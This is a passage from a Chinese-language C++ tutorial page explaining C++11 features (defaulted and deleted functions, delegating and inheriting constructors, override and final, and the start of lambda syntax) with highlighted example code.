ResourceManager&amp; <span class="keyword">operator</span>=(ResourceManager&amp;&amp;) = <span class="keyword">default</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 防止通过整数进行隐式转换构造</span></span><br><span class="line">    <span class="function"><span class="keyword">explicit</span> <span class="title">ResourceManager</span><span class="params">(<span class="keyword">long</span> <span class="keyword">long</span>)</span> </span>= <span class="keyword">delete</span>; <span class="comment">// 禁止 long long 构造</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    NonCopyable nc1;</span><br><span class="line">    <span class="comment">// NonCopyable nc2 = nc1; // 编译错误！复制构造函数被删除</span></span><br><span class="line">    <span class="comment">// NonCopyable nc3;</span></span><br><span class="line">    <span class="comment">// nc3 = nc1;          // 编译错误！复制赋值运算符被删除</span></span><br><span class="line"></span><br><span class="line">    <span class="function">ResourceManager <span class="title">rm1</span><span class="params">(<span class="number">10</span>)</span></span>;</span><br><span class="line">    <span class="comment">// ResourceManager rm2 = rm1; // 编译错误！</span></span><br><span class="line">    ResourceManager rm3 = <span class="built_in">std</span>::move(rm1); <span class="comment">// OK，移动构造函数是默认的</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// ResourceManager rm4(100LL); // 编译错误！long long 构造函数被删除</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>= default</code> 和 <code>= delete</code> 提高了代码的清晰度和对类行为的控制力。</p></li></ul><h3 id="18-3-3-委托构造函数"><a href="#18-3-3-委托构造函数" class="headerlink" title="18.3.3 委托构造函数"></a>18.3.3 委托构造函数</h3><p>C++11 允许一个构造函数调用<strong>同一个类</strong>的另一个构造函数，这称为**委托构造函数 (Delegating Constructor)**。这有助于减少构造函数之间的代码重复。</p><ul><li>  被委托的构造函数（目标构造函数）会先执行。</li><li>  目标构造函数执行完毕后，委托构造函数函数体内的代码（如果有的话）才会执行。</li><li>  委托调用必须出现在构造函数的<strong>初始化列表</strong>位置。</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Report</span> &#123;</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="keyword">int</span> id;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> title;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> content;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">// 目标构造函数 (执行实际初始化)</span></span><br><span class="line">    Report(<span class="keyword">int</span> i, <span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span>&amp; t, <span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span>&amp; c)</span><br><span class="line">        : id(i), title(t), content(c) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Target constructor called (id=&quot;</span> &lt;&lt; id &lt;&lt; <span class="string">&quot;).\n&quot;</span>;</span><br><span class="line">        <span class="comment">// ... 可能还有其他初始化逻辑 ...</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 委托构造函数 1: 提供默认 content</span></span><br><span class="line">    Report(<span class="keyword">int</span> i, <span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span>&amp; t)</span><br><span class="line">        : Report(i, t, <span class="string">&quot;Default Content&quot;</span>) &#123; <span class="comment">// 委托给三个参数的构造函数</span></span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Delegating constructor 1 called.\n&quot;</span>;</span><br><span class="line">        <span class="comment">// 这里可以添加此构造函数特有的逻辑</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 委托构造函数 2: 提供默认 title 和 content</span></span><br><span class="line">    Report(<span class="keyword">int</span> i)</span><br><span class="line">        : Report(i, <span class="string">&quot;Default Title&quot;</span>) &#123; <span class="comment">// 委托给两个参数的构造函数</span></span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Delegating constructor 2 called.\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 委托构造函数 3: 提供所有默认值</span></span><br><span class="line">    Report()</span><br><span class="line">        : Report(<span class="number">0</span>) &#123; <span class="comment">// 委托给一个参数的构造函数</span></span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Delegating constructor 3 (default) called.\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">print</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;ID: &quot;</span> &lt;&lt; id &lt;&lt; <span class="string">&quot;, Title: &quot;</span> &lt;&lt; title &lt;&lt; <span class="string">&quot;, Content: &quot;</span> &lt;&lt; content &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Creating r1:\n&quot;</span>;</span><br><span class="line">    <span class="function">Report <span class="title">r1</span><span class="params">(<span class="number">101</span>, <span class="string">&quot;Monthly Report&quot;</span>, <span class="string">&quot;Details...&quot;</span>)</span></span>; <span class="comment">// 调用目标构造</span></span><br><span class="line">    r1.print();</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;------\n&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Creating r2:\n&quot;</span>;</span><br><span class="line">    <span class="function">Report <span class="title">r2</span><span class="params">(<span class="number">102</span>, <span class="string">&quot;Weekly Update&quot;</span>)</span></span>; <span class="comment">// 调用委托构造 1 -&gt; 目标构造</span></span><br><span class="line">    r2.print();</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;------\n&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Creating r3:\n&quot;</span>;</span><br><span class="line">    <span class="function">Report <span class="title">r3</span><span class="params">(<span class="number">103</span>)</span></span>; <span class="comment">// 调用委托构造 2 -&gt; 委托构造 1 -&gt; 目标构造</span></span><br><span class="line">    r3.print();</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;------\n&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Creating r4:\n&quot;</span>;</span><br><span class="line">    Report r4; <span class="comment">// 调用委托构造 3 -&gt; 委托构造 2 -&gt; 委托构造 1 -&gt; 目标构造</span></span><br><span class="line">    r4.print();</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;------\n&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>委托构造函数使得初始化逻辑可以集中在一个或少数几个构造函数中，其他构造函数只需提供默认值并委托即可。</p><h3 id="18-3-4-继承构造函数"><a href="#18-3-4-继承构造函数" class="headerlink" title="18.3.4 继承构造函数"></a>18.3.4 继承构造函数</h3><p>在 C++11 之前，如果派生类想使用基类的构造函数，它必须在自己的构造函数初始化列表中显式调用基类构造函数，并且为每个需要的基类构造函数签名提供一个对应的派生类构造函数。</p><p>C++11 允许派生类使用 <code>using</code> 声明来<strong>继承</strong>基类的构造函数（但有一些例外，如涉及虚基类的构造函数通常不被继承）。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Base</span> &#123;</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="keyword">int</span> value;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> name;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    Base(<span class="keyword">int</span> v, <span class="built_in">std</span>::<span class="built_in">string</span> n) : value(v), name(n) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Base(int, string) called.\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    Base(<span class="keyword">int</span> v) : Base(v, <span class="string">&quot;DefaultName&quot;</span>) &#123; <span class="comment">// 使用委托构造</span></span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Base(int) called.\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    Base() : Base(<span class="number">0</span>) &#123; <span class="comment">// 使用委托构造</span></span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Base() called.\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">display</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Base - Value: &quot;</span> &lt;&lt; value &lt;&lt; <span class="string">&quot;, Name: &quot;</span> &lt;&lt; name &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Derived</span> :</span> <span class="keyword">public</span> Base &#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="keyword">double</span> extra_data;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">// 继承 Base 的所有构造函数</span></span><br><span class="line">    <span class="keyword">using</span> Base::Base; <span class="comment">// 编译器会生成对应的 Derived 构造函数，它们调用匹配的 Base 构造函数</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 可以添加新的构造函数，或者覆盖继承来的构造函数 (如果签名相同)</span></span><br><span class="line">    Derived(<span class="keyword">double</span> d) : Base(<span class="number">999</span>, <span class="string">&quot;Special&quot;</span>), extra_data(d) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Derived(double) called.\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 如果需要对继承来的构造函数添加额外初始化，需要显式定义</span></span><br><span class="line">    <span class="comment">// 例如，如果想让 Derived(int) 初始化 extra_data</span></span><br><span class="line">    Derived(<span class="keyword">int</span> v) : Base(v), extra_data(<span class="number">0.0</span>) &#123; <span class="comment">// 显式调用基类构造并初始化成员</span></span><br><span class="line">         <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Derived(int) explicitly defined.\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">display_derived</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123;</span><br><span class="line">        display(); <span class="comment">// 调用基类的 display</span></span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Derived - Extra Data: &quot;</span> &lt;&lt; extra_data &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Creating d1:\n&quot;</span>;</span><br><span class="line">    <span class="function">Derived <span class="title">d1</span><span class="params">(<span class="number">10</span>, <span class="string">&quot;Object1&quot;</span>)</span></span>; <span class="comment">// 调用继承来的 Base(int, string) 对应的构造函数</span></span><br><span class="line">    d1.display_derived();</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;------\n&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Creating d2:\n&quot;</span>;</span><br><span class="line">    <span class="function">Derived <span class="title">d2</span><span class="params">(<span class="number">20</span>)</span></span>; <span class="comment">// 调用 Derived 自己定义的 Derived(int) 构造函数</span></span><br><span class="line">    d2.display_derived();</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;------\n&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Creating d3:\n&quot;</span>;</span><br><span class="line">    Derived d3; <span class="comment">// 调用继承来的 Base() 对应的构造函数</span></span><br><span class="line">    d3.display_derived();</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;------\n&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Creating d4:\n&quot;</span>;</span><br><span class="line">    <span class="function">Derived <span class="title">d4</span><span class="params">(<span class="number">3.14</span>)</span></span>; <span class="comment">// 调用 Derived 自己定义的 Derived(double) 构造函数</span></span><br><span class="line">    d4.display_derived();</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;------\n&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>继承构造函数简化了派生类的编写，特别是当基类有多个构造函数时，避免了编写大量仅仅是转发参数的派生类构造函数。</p><h3 id="18-3-5-管理虚方法：override-和-final"><a href="#18-3-5-管理虚方法：override-和-final" class="headerlink" title="18.3.5 管理虚方法：override 和 final"></a>18.3.5 管理虚方法：<code>override</code> 和 <code>final</code></h3><p>C++11 提供了两个新的**上下文关键字 (Contextual Keywords)**（只在特定位置有特殊含义，其他地方可用作标识符）来帮助管理类继承体系中的虚函数：<code>override</code> 和 <code>final</code>。</p><ul><li><p><strong><code>override</code>:</strong></p><ul><li>  显式地放在派生类中<strong>重写 (override)</strong> 的虚函数声明或定义之后。</li><li>  作用：让编译器检查该函数是否<strong>确实</strong>覆盖了基类中的某个虚函数（函数签名、<code>const</code> 限定符、引用限定符必须完全匹配）。</li><li>  如果派生类函数标记为 <code>override</code> 但并未覆盖任何基类虚函数（例如因为拼写错误、参数类型不匹配、<code>const</code> 不匹配），编译器会报错。</li><li>  这有助于防止因意外签名不匹配而导致的覆盖失败（变成隐藏或定义新函数）。</li></ul></li><li><p><strong><code>final</code> (用于虚函数):</strong></p><ul><li>  显式地放在派生类中<strong>重写</strong>的虚函数声明或定义之后。</li><li>  作用：阻止<strong>任何后续</strong>的派生类进一步覆盖这个虚函数。</li></ul></li><li><p><strong><code>final</code> (用于类):</strong></p><ul><li>  放在类定义的 <code>class</code> 关键字之后，类名之前或之后。</li><li>  作用：阻止该类被<strong>任何其他类继承</strong>。</li></ul></li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Document</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">print</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Printing a generic document.\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">save</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* filename)</span> </span>&#123;</span><br><span class="line">         <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Saving generic document to &quot;</span> &lt;&lt; filename &lt;&lt; <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">virtual</span> ~Document() = <span class="keyword">default</span>; <span class="comment">// 虚析构函数很重要</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Report 继承自 Document</span></span><br><span class="line"><span class="comment">// Report 本身也禁止被进一步继承 (final class)</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Report</span> <span class="keyword">final</span> :</span> <span class="keyword">public</span> Document &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">// 使用 override 确保正确覆盖</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">print</span><span class="params">()</span> <span class="keyword">const</span> <span class="keyword">override</span> </span>&#123; <span class="comment">// OK，覆盖了基类的 print</span></span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Printing a specific report.\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// void save(char* filename) override; // 编译错误！参数类型 const char* vs char* 不匹配</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 使用 final 阻止后续派生类覆盖 save</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">save</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* filename)</span> <span class="keyword">override</span> <span class="keyword">final</span> </span>&#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Saving report securely to &quot;</span> &lt;&lt; filename &lt;&lt; <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// void nonVirtualMethod() override; // 编译错误！基类没有这个虚函数</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">// 编译错误！Report 被标记为 final，不能被继承</span></span><br><span class="line"><span class="comment">class SpecialReport : public Report &#123;</span></span><br><span class="line"><span class="comment">public:</span></span><br><span class="line"><span class="comment">    // 编译错误！save 在 Report 中被标记为 final</span></span><br><span class="line"><span class="comment">    // void save(const char* filename) override &#123;</span></span><br><span class="line"><span class="comment">    //     std::cout &lt;&lt; &quot;Trying to save special report...\n&quot;;</span></span><br><span class="line"><span class="comment">    // &#125;</span></span><br><span class="line"><span class="comment">&#125;;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    Document* doc1 = <span class="keyword">new</span> Document();</span><br><span class="line">    Document* doc2 = <span class="keyword">new</span> Report();</span><br><span class="line"></span><br><span class="line">    doc1-&gt;print(); <span class="comment">// Output: Printing a generic document.</span></span><br><span class="line">    doc2-&gt;print(); <span class="comment">// Output: Printing a specific report. (多态)</span></span><br><span class="line"></span><br><span class="line">    doc1-&gt;save(<span class="string">&quot;doc.txt&quot;</span>);</span><br><span class="line">    doc2-&gt;save(<span class="string">&quot;report.txt&quot;</span>); <span class="comment">// 调用 Report::save</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">delete</span> doc1;</span><br><span class="line">    <span class="keyword">delete</span> doc2;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>override</code> 和 <code>final</code> 提高了代码的健壮性和可维护性，使得在复杂的继承体系中更容易正确地管理虚函数，并明确设计意图。</p><h2 id="18-4-Lambda-函数"><a href="#18-4-Lambda-函数" class="headerlink" title="18.4 Lambda 函数"></a>18.4 Lambda 函数</h2><p>C++11 引入了一个非常强大的特性：<strong>Lambda 表达式 (Lambda Expression)**，通常简称为 **Lambda 函数</strong> 或 <strong>Lambda</strong>。Lambda 表达式允许我们在需要可调用对象（如函数指针、函数对象）的地方<strong>就地定义一个匿名的函数对象</strong>。</p><p>Lambda 的主要目的是提供一种简洁的方式来定义简短的、通常只在局部范围内使用的函数或操作，特别是在将它们作为参数传递给 STL 算法时。</p><h3 id="Lambda-表达式语法"><a href="#Lambda-表达式语法" class="headerlink" title="Lambda 表达式语法"></a>Lambda 表达式语法</h3><p>Lambda 表达式的基本语法如下：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[capture_clause](parameters) -&gt; return_type &#123;</span><br><span class="line">    <span class="comment">// function body</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><strong><code>[capture_clause]</code> (捕获子句):</strong> 这是 Lambda 表达式的开始。方括号 <code>[]</code> 用于指定如何从<strong>定义 Lambda 的外部作用域</strong>捕获变量（即让 Lambda 内部可以访问外部变量）。<ul><li>  <code>[]</code>: 不捕获任何外部变量。</li><li>  <code>[=]</code>: 以<strong>值拷贝</strong>方式捕获所有外部作用域中的<strong>自动变量</strong>（局部变量和参数）。</li><li>  <code>[&amp;]</code>: 以<strong>引用</strong>方式捕获所有外部作用域中的<strong>自动变量</strong>。</li><li>  <code>[var]</code>: 以<strong>值拷贝</strong>方式捕获指定的变量 <code>var</code>。</li><li>  <code>[&amp;var]</code>: 以<strong>引用</strong>方式捕获指定的变量 <code>var</code>。</li><li>  <code>[this]</code>: 捕获当前对象的 <code>this</code> 指针（仅在类的非静态成员函数内部有效）。</li><li>  可以混合使用，例如 <code>[=, &amp;var1, &amp;var2]</code> (默认值捕获，但 <code>var1</code> 和 <code>var2</code> 引用捕获)，<code>[&amp;, var1, var2]</code> (默认引用捕获，但 <code>var1</code> 和 <code>var2</code> 值捕获)。</li></ul></li><li>  <strong><code>(parameters)</code> (参数列表):</strong> 可选。与普通函数的参数列表类似，定义 Lambda 接受的参数。如果 Lambda 不需要参数，可以省略 <code>()</code>。</li><li>  <strong><code>-&gt; return_type</code> (返回类型):</strong> 可选。用于显式指定 Lambda 的返回类型。如果省略，编译器会尝试根据函数体中的 <code>return</code> 语句自动推断返回类型（如果函数体只有一个 <code>return</code> 语句，或者所有 <code>return</code> 语句返回相同类型，或者没有 <code>return</code> 语句则推断为 <code>void</code>）。如果无法推断或需要特定类型，则必须显式指定。</li><li>  <strong><code>&#123; function body &#125;</code> (函数体):</strong> 包含 Lambda 执行的代码，与普通函数的函数体类似。</li></ul><p><strong>最简单的 Lambda:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[]()&#123; <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Hello Lambda!\n&quot;</span>; &#125; <span class="comment">// 一个不捕获、不接受参数、无返回值的 Lambda</span></span><br></pre></td></tr></table></figure><p><strong>Lambda 的类型:</strong> 每个 Lambda 表达式都会生成一个<strong>唯一的、未命名的函数对象类型</strong>。这意味着即使两个 Lambda 表达式的文本完全相同，它们的类型也是不同的。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">auto</span> lambda1 = []()&#123;&#125;;</span><br><span class="line"><span class="keyword">auto</span> lambda2 = []()&#123;&#125;;</span><br><span class="line"><span class="comment">// decltype(lambda1) != decltype(lambda2)</span></span><br></pre></td></tr></table></figure><p>我们可以将 Lambda 赋值给 <code>auto</code> 变量，或者存储在 <code>std::function</code> 包装器中。</p><h3 id="18-4-1-比较函数指针、函数符和-Lambda-函数"><a href="#18-4-1-比较函数指针、函数符和-Lambda-函数" class="headerlink" title="18.4.1 比较函数指针、函数符和 Lambda 函数"></a>18.4.1 比较函数指针、函数符和 Lambda 函数</h3><p>在需要传递可调用实体的场景（如 STL 算法）中，我们可以使用函数指针、函数对象（函数符）或 Lambda 函数。</p><ul><li><strong>函数指针:</strong><ul><li>  优点：语法简单，对于已存在的普通函数很方便。</li><li>  缺点：不能携带状态，通常无法内联，灵活性差。</li></ul></li><li><strong>函数对象 